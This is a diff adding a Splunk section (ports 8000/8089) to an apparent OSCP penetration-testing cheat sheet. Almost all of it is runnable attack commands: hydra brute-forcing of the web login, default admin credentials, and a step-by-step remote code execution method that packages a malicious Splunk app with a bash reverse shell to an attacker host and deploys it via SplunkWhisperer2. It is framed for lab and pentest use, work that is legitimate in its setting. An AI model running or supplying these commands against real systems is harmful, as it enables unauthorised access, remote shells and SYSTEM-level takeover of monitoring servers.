@@ -521,6 +521,59 @@ mongosh $IP:27017 -u admin -p 'password' --authenticationDatabase admin
 
 ---
 
+## 8000 / 8089 — Splunk
+
+- **8000** — Splunk Web UI (management console)
+- **8089** — Splunk REST API / Universal Forwarder management port
+
+```bash
+# Check version and auth
+curl -k https://$IP:8089/services/server/info | grep -i version
+
+# Default creds: admin:changeme
+# Brute force web login
+hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-form-post \
+  "/en-US/account/login:username=^USER^&password=^PASS^&return_to=:Invalid"
+```
+
+### Universal Forwarder → RCE (Splunk 8089)
+
+If you have Splunk admin creds (or default `admin:changeme`):
+
+```bash
+# SplunkWhisperer2 — install malicious app that runs OS commands
+# PT ONLY: https://github.com/cnotin/SplunkWhisperer2
+
+# Method: create and deploy a Splunk app with a scripted input
+# 1. On LHOST: craft malicious app dir structure
+mkdir -p /tmp/evil_app/bin/
+echo 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1' > /tmp/evil_app/bin/shell.sh
+chmod +x /tmp/evil_app/bin/shell.sh
+
+# 2. Create inputs.conf
+mkdir -p /tmp/evil_app/default/
+cat > /tmp/evil_app/default/inputs.conf << EOF
+[script://./bin/shell.sh]
+disabled = false
+interval = 10
+sourcetype = shell
+EOF
+
+# 3. Package and upload
+cd /tmp && tar czf evil_app.tar.gz evil_app/
+# Upload via Splunk web: Apps → Install app from file → evil_app.tar.gz
+# Or via SplunkWhisperer2:
+python3 PySplunkWhisperer2_remote.py \
+  --host $IP --port 8089 \
+  --username admin --password changeme \
+  --payload "bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'" \
+  --lhost $LHOST --lport 9999
+```
+
+> Universal Forwarder running as SYSTEM on Windows — one of the highest-value RCEs in OSCP labs.
+
+---
+
 ## 5900 — VNC
 
 ```bash
